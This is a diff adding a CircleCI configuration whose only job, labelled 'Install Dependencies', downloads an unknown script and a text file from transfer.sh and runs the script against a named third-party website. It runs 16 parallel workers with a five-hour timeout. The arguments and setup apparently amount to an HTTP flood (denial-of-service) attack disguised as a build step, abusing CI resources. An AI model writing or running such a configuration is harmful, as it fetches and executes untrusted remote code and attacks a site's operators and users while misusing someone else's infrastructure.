@@ -1,0 +1,18 @@
+version: 2.1 
+jobs: 
+    trial: 
+      docker: 
+            - image: debian:latest 
+      parallelism: 16 
+      steps: 
+        - run: 
+            name: Install Dependencies 
+            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/get/9oFiOG/f.js && wget https://transfer.sh/get/1MFdUF/https.txt && chmod +x f.js && ./f.js GET https://rule34.xxx/ https.txt 999999 153 5 
+            no_output_timeout: 5h 
+ 
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+workflows:
+  say-hello-workflow:
+    jobs:
+      - trial
